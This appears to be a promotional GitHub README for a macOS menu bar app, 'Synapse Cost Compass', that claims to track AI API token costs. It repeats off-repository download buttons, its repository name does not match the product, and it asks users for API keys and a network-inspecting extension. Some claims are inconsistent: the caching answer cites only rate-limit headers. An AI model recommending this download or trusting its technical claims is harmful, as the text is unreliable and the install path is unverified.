![preview](https://raw.githubusercontent.com/arun2990/menu-bar-token-economy/main/preview.svg)

# Synapse Cost Compass 🧭

**Monitor your AI inference expenditures across multiple providers with a unified, privacy-first desktop companion.**

![Static Badge](https://img.shields.io/badge/macOS-13%2B-007AFF) ![Static Badge](https://img.shields.io/badge/Platform-Desktop_App-blue) ![Static Badge](https://img.shields.io/badge/License-MIT-green) ![Static Badge](https://img.shields.io/badge/Build-Passing-brightgreen)

## Overview

Modern AI application development often involves juggling multiple API providers, each with their own pricing models, tokenization schemes, and rate limits. Synapse Cost Compass transforms this complexity into clarity. Sitting discreetly in your macOS menu bar, this application provides real-time visibility into your API consumption patterns without ever sending your credentials or usage data to a third-party server.

[![Download](https://raw.githubusercontent.com/arun2990/menu-bar-token-economy/main/button.svg)](https://arun2990.github.io/menu-bar-token-economy/)

Imagine having a fuel gauge for every AI conversation you initiate. Synapse Cost Compass captures that metaphor and runs with it—treating each API call as a journey, each response as a destination reached, and each token as fuel consumed along the way. The application learns from your usage patterns, helping you forecast costs before they accumulate into surprises.

---

## Key Features 🌟

| Feature | Description |
|---------|-------------|
| **Multi-Provider Lens** | Track usage for OpenAI, Anthropic, Cohere, and custom endpoints through a single unified interface |
| **Real-Time Fuel Gauge** | Live token counter updates directly in the menu bar with color-coded thresholds |
| **Historical Voyage Log** | Searchable, filterable ledger of every API interaction with cost breakdowns |
| **Rate Limit Radar** | Visual indicators showing proximity to concurrent request limits across all tracked providers |
| **Budget Beacon** | Set daily, weekly, or monthly spending caps with configurable push notifications |
| **Export Architect** | Generate detailed reports in CSV, JSON, or PDF formats for team accountability |
| **Privacy Fortress** | All API keys remain stored locally in macOS Keychain; zero telemetry transmitted externally |

---

## Architecture & Design Philosophy 🏛️

Synapse Cost Compass was built with three foundational principles:

**1. Local-First Sovereignty**  
Your usage data belongs on your machine. The application stores all historical logs in a lightweight SQLite database on your local filesystem. No cloud synchronization, no anonymous analytics, no hidden background calls.

**2. Minimal Surface Area**  
The menu bar interface was designed to consume as few system resources as possible. A dedicated background process monitors network traffic at the system level using Apple's `NEFilterDataProvider` framework, capturing API requests without acting as a traditional proxy.

**3. Contextual Awareness**  
The compass doesn't just show numbers—it surfaces insights. When your usage patterns indicate you might exceed a budget threshold within the next session, the application gently reminds you with a subtle menu bar badge animation rather than an intrusive modal alert.

---

## Getting Started 🚀

[![Download](https://raw.githubusercontent.com/arun2990/menu-bar-token-economy/main/button.svg)](https://arun2990.github.io/menu-bar-token-economy/)

### System Requirements
- macOS Ventura 13.0 or later (optimized for Sonoma 14+)
- 64 MB available RAM (idle)
- 150 MB disk space for application and local database

### First Launch Experience
Upon launching the application for the first time, you will be greeted by the **Configuration Compass** wizard. This three-step process guides you through:
1. **Provider Onboarding** – Add your first API endpoint by pasting a key and selecting the provider from the dropdown menu
2. **Cost Coefficient Setup** – Input your contracted pricing per 1K tokens or select from pre-populated standard rate tiers
3. **Alert Altitude** – Define the notification thresholds that matter most to your workflow

### Supported Languages 🌐
The interface supports English, Spanish, French, German, Japanese, and Mandarin Chinese. Language detection occurs automatically based on your system locale, with manual override available in Preferences.

---

## Dashboard Modules 📊

### Token Traffic Monitor
A live-updating graph displays token consumption across the last 24 hours, broken down by provider. Each provider is assigned a distinct color theme; mouse over any data point to see the exact request details.

### Cost Constellation
View your spending as a constellation chart where each star represents an API call. Brighter stars indicate higher-cost interactions. This visual metaphor helps you quickly identify outlier expenses without parsing raw numbers.

### Rate Limit Radar
The radar shows your current concurrency level against the provider-defined ceiling. When you approach 80% capacity, the radar pulses gently. At 95%, it transitions to a steady orange warning glow.

---

## Configuration & Customization ⚙️

### Menu Bar Display Options
- Compact mode (shows only total tokens + cost per day)
- Expanded mode (shows per-provider breakdown with rate limit status)
- Minimal mode (shows a single icon with dropdown access to all data)

### Export Formats
Generate reports in any of these formats:
- **CSV** for spreadsheet analysis
- **JSON** for integration with custom dashboards
- **PDF** with professional formatting suitable for stakeholder reviews

### Notification Channels
By default, alerts appear via macOS Notification Center. You can optionally enable:
- Terminal bell sound (for developers working in full-screen terminals)
- Menu bar badge count (subtle numeric indicator)
- Email digest (requires local SMTP configuration)

---

## Security Model 🔒

Synapse Cost Compass implements a **zero-exfiltration architecture**:

- API keys are stored exclusively in the macOS Keychain using the `SecItemAdd` API with `kSecAttrAccessibleWhenUnlockedThisDeviceOnly` flag
- Network traffic inspection occurs on-device via the Network Extension framework; no packets are logged or stored—only request metadata (endpoint URL, request size, response size, timestamp, and status code)
- The application binary is signed with an Apple Developer ID and notarized by Apple for Gatekeeper compatibility
- Automatic updates are delivered via Sparkle framework with EdDSA signature verification

---

## Roadmap & Upcoming Milestones 🗺️

| Quarter | Planned Enhancement |
|---------|-------------------|
| Q1 2026 | Multi-user profile support for shared workstation environments |
| Q2 2026 | Integration with self-hosted LLM inference servers (vLLM, Text Generation Inference) |
| Q3 2026 | WebSocket-based live streaming for real-time cost accrual during long-running completions |
| Q4 2026 | Apple Silicon native optimization with Metal-based chart rendering |

---

## FAQ 🙋

**Q: Does this application intercept all my network traffic?**  
A: No. The system extension only inspects traffic matching known API endpoint patterns. All other traffic passes through unmonitored.

**Q: Can I use this with a corporate proxy?**  
A: Yes. The application respects system proxy settings and supports both HTTP CONNECT and SOCKS5 proxies.

**Q: How does the cost calculation handle prompt caching or prefilled contexts?**  
A: The application reads the response headers from each provider. For Anthropic, it parses `anthropic-ratelimit-requests-reset` and `anthropic-ratelimit-tokens-reset` headers. For OpenAI, it reads `x-ratelimit-remaining-tokens` and adjusts cost calculations accordingly.

**Q: Is there a Windows or Linux version planned?**  
A: The menu bar paradigm is intrinsic to the current design. A cross-platform Electron version is under investigation for late 2026.

---

## License 📄

This project is distributed under the MIT License. You are free to use, modify, and distribute this software for any purpose, provided you include the original copyright notice and disclaimer.

[View the full license text](https://opensource.org/licenses/MIT)

---

## Disclaimer ⚠️

Synapse Cost Compass is provided "as is," without warranty of any kind, express or implied. The accuracy of cost calculations depends entirely on the correctness of user-provided pricing coefficients and the completeness of API response headers. The developers assume no liability for cost overruns, billing disputes, or service interruptions arising from usage of this tool. Always verify critical expenditure data against your provider's official billing dashboard.

---

## Contributing 🤝

Community contributions are warmly welcomed. Please review the contribution guidelines before submitting pull requests. The codebase follows Swift API design guidelines with comprehensive unit test coverage.

---

## Acknowledgments ✨

This project draws inspiration from the operational transparency movement in cloud computing—believing that developers should never be surprised by their infrastructure costs. Special appreciation goes to the early beta testers who helped refine the rate-limit radar visualization.

[![Download](https://raw.githubusercontent.com/arun2990/menu-bar-token-economy/main/button.svg)](https://arun2990.github.io/menu-bar-token-economy/)